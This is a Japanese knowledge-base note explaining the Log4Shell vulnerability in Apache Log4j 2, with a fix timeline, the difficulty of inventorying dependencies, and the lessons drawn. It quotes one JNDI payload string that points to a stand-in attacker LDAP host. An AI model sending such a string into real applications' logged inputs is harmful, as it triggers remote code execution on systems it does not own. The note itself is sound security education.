---
created: 2026-09-02 22:24
updated: 2026-09-02 22:24
---
# Log4Shell (CVE-2021-44228)

Apache Log4j 2 の JNDI ルックアップ機能を悪用して、ログに出力される文字列だけでリモートコード実行が可能になった脆弱性。2021年12月に公開され、CVSS 10.0。 #security #java

## 何が起きるのか

Log4j 2 には、ログメッセージ中の `${...}` を実行時に展開する「message lookup substitution」という機能があった。そのルックアップの一種として JNDI (Java Naming and Directory Interface) が使えたため、

```
${jndi:ldap://attacker.example.com/a}
```

という文字列がログに出力されると、Log4jが攻撃者のLDAPサーバへ接続し、返されたクラスをリモートからロードして実行してしまう。

問題の深刻さは「**ログに出るだけで発火する**」点にある。User-Agent、ユーザー名、検索クエリ、HTTPヘッダなど、アプリケーションがログに書きうるあらゆる入力が攻撃経路になる。認証前のエンドポイントでも成立するため、事前条件がほぼない。

## タイムライン

| 日付 | 出来事 |
|---|---|
| 2013-07-18 | 問題のJNDIルックアップ機能がコミットされる |
| 2021-11-24 | Alibabaの Chen Zhaojun がApacheへ報告 |
| 2021-12-01 | Cloudflareが観測した最も早い悪用の痕跡 |
| 2021-12-09 | CVEが公開され、同日にTwitter上でPoCが公開される |
| 2021-12-10 | 2.15.0 リリース（message lookupをデフォルト無効化、JNDIを制限） |
| 2021-12-13 | 2.16.0 リリース（message lookupを完全削除、JNDIをデフォルト無効化）。2.15.0の修正が不十分だったため(CVE-2021-45046) |
| 2021-12-17 | 2.17.0 リリース（CVE-2021-45105 対応） |
| 2021-12-28 | 2.17.1 リリース（CVE-2021-44832 対応） |

影響を受けるのは log4j-core 2.0-beta9 〜 2.14.1。

## なぜ影響範囲の特定が難しかったのか

Log4jはJavaエコシステムで極めて広く使われており、多くの場合**推移的依存**として、あるいはfat JAR/WARの中に埋め込まれた形で入っていた。「自社の製品にlog4jが入っているか」という問いに即答できる組織が少なく、多くの時間が修正ではなく**棚卸し**に費やされた。

この経験が [[sbom|SBOM]] の普及を後押しした。同時期の米国大統領令14028と合わせて、「成果物に何が入っているかを機械可読に列挙しておく」ことが調達要件として広がる契機になっている。

## 教訓として残ったもの

- **ログ出力は信頼できない入力の通り道である**という認識。ロギングライブラリに式評価機能があること自体がリスクだった。
- 依存の深さ。直接依存していなくても影響を受ける[[supply-chain-attack|サプライチェーン]]的な性質。
- 修正が1回では終わらなかったこと。緊急パッチの後に続けて3件のCVEが出ており、「とりあえず最新に上げる」を何度もやる必要があった。

## 出典

- [Log4Shell - Wikipedia](https://en.wikipedia.org/wiki/Log4Shell)
- [Rapid7 Analysis: CVE-2021-44228 (Log4Shell)](https://www.rapid7.com/blog/post/ra-cve-2021-44228-log4shell-analysis/)
- [Log4Shell Zero-Day Vulnerability - CVE-2021-44228 (JFrog)](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
